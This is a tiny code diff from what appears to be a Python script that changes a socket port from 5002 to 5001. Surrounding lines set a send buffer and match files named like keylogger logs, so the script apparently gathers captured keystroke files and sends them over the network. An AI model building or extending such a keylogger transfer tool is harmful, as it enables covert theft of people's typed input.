@@ -10,7 +10,7 @@ BUFFER_SIZE = 4096 # send 4096 bytes each time step
 
 host = socket.gethostname()
 # the port, let's use 5001
-port = 5002
+port = 5001
 #regex pattern searching
 rootdir = os.getcwd()
 pattern = re.compile("^keylog-\d{4}-\d{2}-\d{2}-\d{6}_\d{4}-\d{2}-\d{2}-\d{6}\.txt$")
